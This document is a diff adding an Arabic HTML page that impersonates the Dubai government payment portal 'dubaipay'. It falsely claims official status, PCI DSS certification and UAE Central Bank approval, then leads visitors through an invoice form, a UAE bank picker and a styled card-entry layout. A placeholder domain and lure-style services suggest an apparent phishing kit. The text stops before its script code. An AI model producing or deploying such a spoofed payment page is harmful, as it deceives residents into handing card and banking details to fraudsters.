@@ -1,0 +1,1637 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>سداد دبي | dubaipay</title>
+
+    <!-- ===== Open Graph / Link Preview ===== -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="سداد دبي | dubaipay">
+    <meta property="og:description" content="منصة دفع إلكتروني آمنة ومعتمدة — دفع الفواتير والرسوم الحكومية بكل سهولة وموثوقية.">
+    <meta property="og:image" content="https://i.ibb.co/60PNWRzx/1795463254580.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:url" content="https://YOUR-DOMAIN.com">
+    <meta property="og:site_name" content="سداد دبي">
+    <meta property="og:locale" content="ar_AE">
+
+    <!-- ===== Twitter Card ===== -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="سداد دبي | dubaipay">
+    <meta name="twitter:description" content="منصة دفع إلكتروني آمنة ومعتمدة">
+    <meta name="twitter:image" content="https://i.ibb.co/60PNWRzx/1795463254580.jpg">
+
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --uae-bg: #F5F7FA;
+            --uae-white: #FFFFFF;
+            --uae-green: #007A3D;
+            --uae-green-dark: #056A38;
+            --uae-green-light: #E8F5EE;
+            --uae-red: #E31B23;
+            --uae-black: #0A0E14;
+            --uae-text-dark: #0F172A;
+            --uae-text-mid: #334155;
+            --uae-text-muted: #64748B;
+            --uae-gray: #E2E8F0;
+            --uae-gray-50: #F8FAFC;
+            --uae-border: #CBD5E1;
+            --uae-shadow: 0 1px 2px rgba(15,23,42,0.04), 0 4px 12px rgba(15,23,42,0.04);
+            --uae-shadow-lg: 0 4px 6px rgba(15,23,42,0.04), 0 12px 32px rgba(15,23,42,0.06);
+            
+            /* ألوان دبي باي */
+            --dp-blue-dark: #1D2D5C;
+            --dp-blue: #2B8FC4;
+            --dp-teal: #3BBFAD;
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        html { height: -webkit-fill-available; }
+
+        body {
+            font-family: 'Noto Naskh Arabic', 'Traditional Arabic', 'Times New Roman', serif;
+            background-color: var(--uae-bg);
+            color: var(--uae-text-dark);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            min-height: -webkit-fill-available;
+            -webkit-font-smoothing: antialiased;
+            font-size: 16px;
+            line-height: 1.8;
+            font-weight: 400;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 460px;
+            padding: 0;
+            padding-bottom: calc(20px + env(safe-area-inset-bottom));
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        /* ===== شاشة الترحيب المتحركة (سداد دبي) ===== */
+        .splash-screen {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            background: #FFFFFF;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            padding-top: calc(24px + env(safe-area-inset-top));
+            padding-bottom: calc(24px + env(safe-area-inset-bottom));
+            transition: opacity 0.6s ease, visibility 0.6s ease;
+            overflow: hidden;
+        }
+
+        .splash-screen.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        /* الحركات للشعار */
+        .splash-logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: logoEntry 1.2s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+            opacity: 0;
+            transform: scale(0.8) translateY(20px);
+            margin-bottom: 40px;
+        }
+
+        @keyframes logoEntry {
+            0% { opacity: 0; transform: scale(0.85) translateY(20px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        /* شكل البطاقة الأيقونية */
+        .dp-card-icon {
+            width: 110px;
+            height: 76px;
+            background: linear-gradient(135deg, var(--dp-blue) 0%, var(--dp-teal) 100%);
+            border-radius: 12px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 24px;
+            box-shadow: 0 10px 25px -5px rgba(43, 143, 196, 0.4);
+            animation: floatCard 4s ease-in-out infinite;
+        }
+
+        @keyframes floatCard {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .dp-card-inner {
+            width: 80%;
+            height: 50%;
+            background: #FFFFFF;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        .dp-card-inner::before {
+            content: '';
+            position: absolute;
+            top: 22%;
+            left: 10%;
+            right: 10%;
+            height: 4px;
+            background: rgba(29, 45, 92, 0.15);
+            border-radius: 2px;
+        }
+
+        .dp-dot {
+            width: 6px;
+            height: 6px;
+            background-color: var(--dp-blue);
+            border-radius: 50%;
+            opacity: 0.8;
+        }
+        .dp-dot:nth-child(1) { animation: pulseDot 1.5s infinite 0.0s; }
+        .dp-dot:nth-child(2) { animation: pulseDot 1.5s infinite 0.2s; }
+        .dp-dot:nth-child(3) { animation: pulseDot 1.5s infinite 0.4s; }
+
+        @keyframes pulseDot {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.3); }
+        }
+
+        /* نصوص الشعار */
+        .dp-brand-ar {
+            font-family: 'Noto Naskh Arabic', serif;
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: var(--dp-blue-dark);
+            line-height: 1;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+            text-align: center;
+        }
+
+        .dp-brand-en {
+            font-family: 'Inter', sans-serif;
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--dp-blue-dark);
+            letter-spacing: -1px;
+            line-height: 1;
+        }
+
+        /* شريط التحميل السفلي */
+        .splash-loader-wrap {
+            position: absolute;
+            bottom: calc(60px + env(safe-area-inset-bottom));
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            animation: fadeInDelay 1s 0.8s forwards;
+        }
+
+        @keyframes fadeInDelay {
+            to { opacity: 1; }
+        }
+
+        .splash-progress {
+            width: 140px;
+            height: 3px;
+            background: var(--uae-gray);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .splash-progress-fill {
+            height: 100%;
+            background: var(--dp-blue);
+            border-radius: 3px;
+            animation: progressFill 4s linear forwards;
+        }
+
+        @keyframes progressFill {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        .splash-secure-text {
+            font-size: 0.75rem;
+            color: var(--uae-text-muted);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .splash-secure-text i {
+            color: var(--dp-blue);
+        }
+
+        /* ===== بقية الصفحة (الواجهة الرئيسية) ===== */
+        .official-top-bar {
+            background: var(--dp-blue-dark);
+            color: #E2E8F0;
+            padding: 10px 20px;
+            padding-top: calc(10px + env(safe-area-inset-top));
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            font-family: 'Inter', 'Noto Naskh Arabic', sans-serif;
+        }
+
+        .official-top-bar .brand-side {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .official-top-bar .flag-strip {
+            display: flex;
+            width: 22px;
+            height: 14px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .official-top-bar .flag-strip .f-green { flex: 1; background: #007A3D; }
+        .official-top-bar .flag-strip .f-white { flex: 1; background: #FFFFFF; }
+        .official-top-bar .flag-strip .f-black { flex: 1; background: #000000; }
+
+        .official-top-bar .secure-side {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: var(--dp-teal);
+            font-size: 10px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .official-top-bar .secure-side i { font-size: 10px; }
+
+        .top-accent-bar {
+            height: 3px;
+            background: linear-gradient(to left, var(--dp-blue) 0%, var(--dp-blue) 33%, var(--dp-teal) 33%, var(--dp-teal) 66%, var(--dp-blue-dark) 66%, var(--dp-blue-dark) 100%);
+        }
+
+        .main-wrap {
+            padding: 16px;
+            padding-bottom: calc(16px + env(safe-area-inset-bottom));
+        }
+
+        .screen {
+            display: none;
+            background-color: var(--uae-white);
+            border-radius: 14px;
+            box-shadow: var(--uae-shadow-lg);
+            overflow: hidden;
+            border: 1px solid var(--uae-gray);
+            margin-bottom: 16px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .active-screen { display: block; }
+
+        .header {
+            padding: 22px 20px;
+            text-align: center;
+            border-bottom: 1px solid var(--uae-gray);
+            background: linear-gradient(180deg, #FBFCFD 0%, #FFFFFF 100%);
+        }
+
+        .header h1 {
+            color: var(--uae-text-dark);
+            font-size: 1.3rem;
+            margin: 0 0 6px 0;
+            font-weight: 700;
+            letter-spacing: 0;
+            line-height: 1.5;
+        }
+
+        .header p {
+            color: var(--uae-text-muted);
+            font-size: 0.9rem;
+            margin: 0;
+            font-weight: 400;
+            line-height: 1.7;
+        }
+
+        .header .official-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #E0F2FE;
+            color: var(--dp-blue-dark);
+            font-size: 11px;
+            font-weight: 600;
+            padding: 5px 12px;
+            border-radius: 20px;
+            border: 1px solid #BAE6FD;
+            margin-bottom: 12px;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .content { padding: 22px 20px; }
+
+        .screen-image {
+            text-align: center;
+            margin-bottom: 20px;
+            padding: 8px;
+            background: var(--uae-gray-50);
+            border-radius: 12px;
+            border: 1px solid var(--uae-gray);
+        }
+
+        .screen-image img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            display: block;
+        }
+
+        .description {
+            color: var(--uae-text-mid);
+            font-size: 0.95rem;
+            line-height: 1.9;
+            margin-bottom: 20px;
+            text-align: right;
+            font-weight: 400;
+        }
+
+        .btn-main {
+            width: 100%;
+            padding: 15px;
+            background-color: var(--dp-blue-dark);
+            color: var(--uae-white);
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            font-family: 'Noto Naskh Arabic', serif;
+            -webkit-appearance: none;
+            letter-spacing: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 2px 4px rgba(29,45,92,0.15);
+            min-height: 52px;
+        }
+
+        .btn-main:hover { background-color: #141f42; }
+        .btn-main:active { transform: scale(0.985); }
+
+        .btn-red {
+            background-color: var(--uae-red);
+            box-shadow: 0 2px 4px rgba(227,27,35,0.15);
+        }
+        .btn-red:hover { background-color: #B9151B; }
+
+        .trust-ribbon {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 18px;
+            padding-top: 16px;
+            border-top: 1px dashed var(--uae-gray);
+        }
+
+        .trust-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            gap: 6px;
+            padding: 10px 6px;
+            background: var(--uae-gray-50);
+            border: 1px solid var(--uae-gray);
+            border-radius: 10px;
+        }
+
+        .trust-item .t-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #E0F2FE;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--dp-blue);
+            font-size: 13px;
+        }
+
+        .trust-item .t-label {
+            font-size: 10px;
+            font-weight: 600;
+            color: var(--uae-text-mid);
+            line-height: 1.3;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .trust-item .t-sub {
+            font-size: 9px;
+            color: var(--uae-text-muted);
+            font-weight: 400;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .license-banner {
+            background: linear-gradient(135deg, #F0F9FF 0%, #E0F2FE 100%);
+            border: 1px solid #BAE6FD;
+            border-radius: 10px;
+            padding: 12px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 16px;
+            font-size: 11px;
+            color: var(--dp-blue-dark);
+            font-weight: 500;
+            line-height: 1.7;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .license-banner i {
+            color: var(--dp-blue);
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .loading-screen { text-align: center; padding: 55px 20px; }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--uae-gray);
+            border-top-color: var(--dp-blue);
+            border-radius: 50%;
+            animation: spin 0.9s infinite linear;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .loading-text {
+            font-size: 1.05rem;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--uae-text-dark);
+        }
+
+        .loading-subtext { color: var(--uae-text-muted); font-size: 0.88rem; }
+
+        .form-group { margin-bottom: 18px; }
+
+        .form-group label {
+            display: block;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 7px;
+            text-align: right;
+            color: var(--uae-text-mid);
+            letter-spacing: 0;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 13px 14px;
+            border: 1px solid var(--uae-border);
+            border-radius: 8px;
+            background-color: var(--uae-gray-50);
+            box-sizing: border-box;
+            font-size: 1rem;
+            transition: border-color 0.2s, background 0.2s;
+            text-align: right;
+            font-family: 'Noto Naskh Arabic', serif;
+            -webkit-appearance: none;
+            color: var(--uae-text-dark);
+            font-weight: 500;
+            min-height: 48px;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--dp-blue);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(43,143,196,0.08);
+        }
+
+        .bank-grid { display: grid; gap: 10px; }
+
+        .bank-card {
+            border: 1px solid var(--uae-border);
+            padding: 14px 16px;
+            border-radius: 10px;
+            text-align: right;
+            background-color: var(--uae-white);
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.95rem;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 12px;
+            min-height: 54px;
+            color: var(--uae-text-mid);
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .bank-card:active { transform: scale(0.99); }
+
+        .bank-card:hover {
+            border-color: var(--dp-blue);
+            background-color: #F0F9FF;
+            color: var(--dp-blue-dark);
+        }
+
+        .bank-card .bank-logo-img {
+            width: 28px;
+            height: 28px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+
+        .bank-card .chevron {
+            margin-right: auto;
+            color: var(--uae-text-muted);
+            font-size: 11px;
+        }
+
+        .footer {
+            padding: 14px 16px;
+            text-align: center;
+            background-color: var(--uae-gray-50);
+            border-top: 1px solid var(--uae-gray);
+            font-size: 0.78rem;
+            color: var(--uae-text-muted);
+            font-weight: 400;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .footer .footer-secure {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            color: var(--dp-blue-dark);
+            font-weight: 600;
+            font-size: 0.8rem;
+        }
+
+        .payment-option {
+            border: 1px solid var(--uae-border);
+            border-radius: 12px;
+            padding: 18px 16px;
+            margin-bottom: 12px;
+            background-color: var(--uae-white);
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            min-height: 72px;
+        }
+
+        .payment-option:hover,
+        .payment-option:active {
+            border-color: var(--dp-blue);
+            background-color: #F0F9FF;
+        }
+
+        .payment-option-icon {
+            font-size: 1.5rem;
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #E0F2FE;
+            border-radius: 10px;
+            flex-shrink: 0;
+        }
+
+        .payment-option-text {
+            font-weight: 600;
+            font-size: 1rem;
+            color: var(--uae-text-dark);
+            margin-bottom: 2px;
+        }
+
+        .payment-option-desc {
+            font-size: 0.85rem;
+            color: var(--uae-text-muted);
+            font-weight: 400;
+        }
+
+        .payment-option-content { display: flex; flex-direction: column; flex: 1; }
+
+        .payment-option .arrow {
+            color: var(--dp-blue);
+            font-size: 13px;
+        }
+
+        .cc-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 18px;
+            text-align: center;
+        }
+
+        .cc-header h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--uae-text-dark);
+            margin: 0 0 4px 0;
+        }
+
+        .cc-header p {
+            font-size: 0.9rem;
+            color: var(--uae-text-muted);
+            margin: 0;
+            font-weight: 400;
+        }
+
+        .cc-ref {
+            font-size: 10px;
+            color: var(--uae-text-muted);
+            font-weight: 500;
+            margin-top: 6px;
+            font-family: 'Inter', monospace;
+            letter-spacing: 0.5px;
+            background: var(--uae-gray-50);
+            padding: 3px 10px;
+            border-radius: 6px;
+            border: 1px solid var(--uae-gray);
+        }
+
+        .cc-visual {
+            background: linear-gradient(135deg, #1E293B 0%, #0F172A 100%);
+            border-radius: 16px;
+            padding: 22px;
+            box-shadow: 0 12px 28px -8px rgba(15,23,42,.4);
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 18px;
+        }
+
+        .cc-visual::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -30%;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(255,255,255,0.06) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .cc-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .cc-chip {
+            width: 38px;
+            height: 30px;
+            background: linear-gradient(135deg, #FDE68A, #EAB308);
+            border-radius: 5px;
+            opacity: 0.85;
+        }
+
+        .cc-brand { font-size: 28px; color: rgba(255,255,255,.85); }
+
+        .cc-number {
+            font-family: 'Inter', monospace;
+            font-size: 17px;
+            letter-spacing: 2px;
+            text-shadow: 0 2px 4px rgba(0,0,0,.5);
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 10;
+            color: rgba(255,255,255,.95);
+            font-weight: 500;
+        }
+
+        .cc-bottom {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            position: relative;
+            z-index: 10;
+            color: #94A3B8;
+        }
+
+        .cc-label {
+            font-size: 9px;
+            text-transform: uppercase;
+            margin-bottom: 3px;
+            letter-spacing: 0.6px;
+            font-weight: 500;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .cc-value {
+            font-weight: 600;
+            font-size: 13px;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .cc-group {
+            border: 1px solid var(--uae-border);
+            border-radius: 12px;
+            overflow: hidden;
+            background: #fff;
+            transition: all 0.2s;
+            margin-bottom: 18px;
+        }
+
+        .cc-group:focus-within {
+            border-color: var(--dp-blue);
+            box-shadow: 0 0 0 3px rgba(43,143,196,0.08);
+        }
+
+        .cc-input {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-bottom: 1px solid var(--uae-gray);
+            background: #fff;
+            font-size: 1rem;
+            color: var(--uae-text-dark);
+            outline: none;
+            transition: background 0.2s;
+            font-family: 'Inter', 'Noto Naskh Arabic', sans-serif;
+            -webkit-appearance: none;
+            border-radius: 0;
+            font-weight: 500;
+            min-height: 52px;
+        }
+
+        .cc-input:focus { background: var(--uae-gray-50); }
+
+        .cc-input::placeholder {
+            color: #94A3B8;
+            font-weight: 400;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .cc-input.last-row { border-bottom: none; }
+
+        .cc-input.icon-pad { padding-left: 44px; }
+
+        .cc-input-rel { position: relative; }
+
+        .cc-input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94A3B8;
+            font-size: 15px;
+        }
+
+        .cc-row { display: flex; }
+        .cc-row > div { width: 50%; }
+        .cc-row > div:first-child { border-left: 1px solid var(--uae-gray); }
+        .cc-text-center { text-align: center; }
+
+        .session-timer {
+            background: #E0F2FE;
+            color: var(--dp-blue-dark);
+            font-size: 11px;
+            font-weight: 600;
+            padding: 6px 12px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            border: 1px solid #BAE6FD;
+            margin-bottom: 14px;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+
+        .timer-wrap { display: flex; justify-content: center; }
+
+        .mobile-hint {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: var(--uae-text-muted);
+            margin-top: 12px;
+            font-weight: 400;
+            font-family: 'Noto Naskh Arabic', serif;
+        }
+        .mobile-hint i { color: var(--dp-blue); }
+
+        @media (max-width: 380px) {
+            .cc-number { font-size: 15px; letter-spacing: 1.5px; }
+            .cc-visual { padding: 18px; }
+            .header h1 { font-size: 1.15rem; }
+            .official-top-bar { padding: 9px 14px; font-size: 10px; }
+            .dp-brand-ar { font-size: 1.9rem; }
+            .dp-brand-en { font-size: 1.7rem; }
+            .dp-card-icon { width: 95px; height: 66px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- شاشة الترحيب المتحركة (هوية دبي باي) -->
+<div id="splashScreen" class="splash-screen">
+    <div class="splash-logo-container">
+        <div class="dp-card-icon">
+            <div class="dp-card-inner">
+                <div class="dp-dot"></div>
+                <div class="dp-dot"></div>
+                <div class="dp-dot"></div>
+            </div>
+        </div>
+        <div class="dp-brand-ar">سداد دبي</div>
+        <div class="dp-brand-en">dubaipay</div>
+    </div>
+
+    <div class="splash-loader-wrap">
+        <div class="splash-progress">
+            <div class="splash-progress-fill"></div>
+        </div>
+        <div class="splash-secure-text">
+            <i class="fas fa-lock"></i>
+            اتصال آمن ومشفر بمعايير PCI DSS
+        </div>
+    </div>
+</div>
+
+<div class="container">
+
+    <div class="official-top-bar">
+        <div class="brand-side">
+            <div class="flag-strip">
+                <div class="f-green"></div>
+                <div class="f-white"></div>
+                <div class="f-black"></div>
+            </div>
+            <span>سداد دبي</span>
+        </div>
+        <div class="secure-side">
+            <i class="fas fa-lock"></i>
+            <span>اتصال آمن SSL</span>
+        </div>
+    </div>
+    <div class="top-accent-bar"></div>
+
+    <div class="main-wrap">
+
+        <div id="screen-welcome" class="screen active-screen">
+            <div class="header">
+                <div class="official-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>منصة دفع إلكتروني رسمية</span>
+                </div>
+                <h1>مرحباً بك في سداد دبي</h1>
+                <p>الدفع الإلكتروني الآمن والموثوق</p>
+            </div>
+            <div class="content">
+                <div class="screen-image">
+                    <img src="https://images.unsplash.com/photo-1616077168399-567a57a1608d?auto=format&fit=crop&w=300&q=80" alt="سداد دبي">
+                </div>
+                <div class="description">
+                    بوابة سداد دبي هي منصة دفع إلكتروني آمنة ومعتمدة، تتيح للمواطنين والمقيمين دفع الفواتير والرسوم الحكومية والخاصة بكل سهولة وموثوقية.
+                    <br><br>
+                    تعمل المنصة وفق أعلى معايير الأمان العالمية (PCI DSS) وتتكامل مع جميع البنوك المحلية، لضمان حماية بياناتك المالية وسرية معاملاتك.
+                    <br><br>
+                    يمكنك استخدام البوابة لدفع فواتير الكهرباء والمياه والهاتف والإنترنت، بالإضافة إلى الرسوم الحكومية والخدمات الأخرى.
+                </div>
+                <button class="btn-main" onclick="startAndNotify()">
+                    <i class="fas fa-arrow-left"></i>
+                    <span>بدء عملية الدفع</span>
+                </button>
+
+                <div class="trust-ribbon">
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-shield-alt"></i></div>
+                        <div class="t-label">PCI DSS</div>
+                        <div class="t-sub">مستوى 1</div>
+                    </div>
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-lock"></i></div>
+                        <div class="t-label">تشفير 256-bit</div>
+                        <div class="t-sub">SSL/TLS</div>
+                    </div>
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-check-circle"></i></div>
+                        <div class="t-label">3D Secure</div>
+                        <div class="t-sub">تحقق بنكي</div>
+                    </div>
+                </div>
+
+                <div class="license-banner">
+                    <i class="fas fa-certificate"></i>
+                    <span>منصة دفع معتمدة ومتوافقة مع معايير مصرف الإمارات العربية المتحدة المركزي</span>
+                </div>
+            </div>
+            <div class="footer">
+                <div class="footer-secure">
+                    <i class="fas fa-lock"></i>
+                    <span>جميع المعاملات محمية ومشفرة</span>
+                </div>
+                <span>© 2026 سداد دبي | dubaipay</span>
+            </div>
+        </div>
+
+        <div id="screen-preparing" class="screen">
+            <div class="header">
+                <h1 style="color: var(--dp-blue); margin:0;">جاري تحضير الخدمة</h1>
+            </div>
+            <div class="loading-screen">
+                <div class="spinner"></div>
+                <div class="loading-text">جاري إعداد بيئة الدفع الآمنة</div>
+                <div class="loading-subtext">يرجى الانتظار قليلاً</div>
+            </div>
+        </div>
+
+        <div id="screen-form" class="screen">
+            <div class="header">
+                <div class="official-badge">
+                    <i class="fas fa-file-invoice"></i>
+                    <span>بيانات الفاتورة</span>
+                </div>
+                <h1>إدخال بيانات الدفع</h1>
+                <p>يرجى تعبئة الحقول التالية بدقة</p>
+            </div>
+            <div class="content">
+                <form id="dataForm" onsubmit="saveUserData(event)">
+                    <div class="form-group">
+                        <label>رقم الفاتورة</label>
+                        <input type="text" id="invoiceNumber" class="form-control" placeholder="أدخل رقم الفاتورة" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>نوع الخدمة</label>
+                        <select id="serviceType" class="form-control" required onchange="autoFillAmount(this)">
+                            <option value="" disabled selected>اختر نوع الخدمة</option>
+                            <option>دفع فواتير (هيئة المياه والكهرباء)</option>
+                            <option>رسوم خدمات حكومية</option>
+                            <option>خدمات الاتصالات والإنترنت</option>
+                            <option>حجز عقار</option>
+                            <option>حجز بوفيه</option>
+                            <option>حجز شاليه</option>
+                            <option>حجز مركبة</option>
+                            <option>مدفوعات حكومية</option>
+                            <option>مدفوعات إلكترونيات</option>
+                            <option>توصيل شحنة</option>
+                            <option>خدمة توصيل</option>
+                            <option>خدمة أخرى</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>مبلغ السداد (درهم إماراتي)</label>
+                        <input type="number" id="amount" class="form-control" placeholder="AED 0.00" min="1" step="0.01" inputmode="decimal" required>
+                    </div>
+
+                    <button type="submit" class="btn-main">
+                        <i class="fas fa-check"></i>
+                        <span>تأكيد البيانات والمتابعة</span>
+                    </button>
+                </form>
+            </div>
+            <div class="footer">
+                <div class="footer-secure">
+                    <i class="fas fa-lock"></i>
+                    <span>بياناتك محمية بتشفير 256-bit</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="screen-loading" class="screen">
+            <div class="header">
+                <h1 style="color: var(--dp-blue); margin:0;">جاري التحميل</h1>
+            </div>
+            <div class="loading-screen">
+                <div class="spinner"></div>
+                <div class="loading-text">يتم الآن تجهيز خيارات الدفع</div>
+            </div>
+        </div>
+
+        <div id="screen-banks" class="screen">
+            <div class="header">
+                <div class="official-badge">
+                    <i class="fas fa-university"></i>
+                    <span>اختيار البنك</span>
+                </div>
+                <h1>اختر البنك الخاص بك</h1>
+                <p>يرجى اختيار البنك الذي ترغب في إتمام الدفع من خلاله</p>
+            </div>
+            <div class="content">
+                <div class="bank-grid">
+                    <div class="bank-card" onclick="selectBank('بنك الإمارات دبي الوطني', 'https://cdn-icons-png.flaticon.com/512/3014/3014028.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/3014/3014028.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك الإمارات دبي الوطني</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك أبوظبي الأول', 'https://cdn-icons-png.flaticon.com/512/3135/3135768.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/3135/3135768.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك أبوظبي الأول</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك أبوظبي التجاري', 'https://cdn-icons-png.flaticon.com/512/2830/2830293.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/2830/2830293.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك أبوظبي التجاري</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك دبي الإسلامي', 'https://cdn-icons-png.flaticon.com/512/6001/6001396.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/6001/6001396.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك دبي الإسلامي</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك المشرق', 'https://cdn-icons-png.flaticon.com/512/1041/1041891.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/1041/1041891.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك المشرق</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك أبوظبي الإسلامي', 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="بنك" class="bank-logo-img">
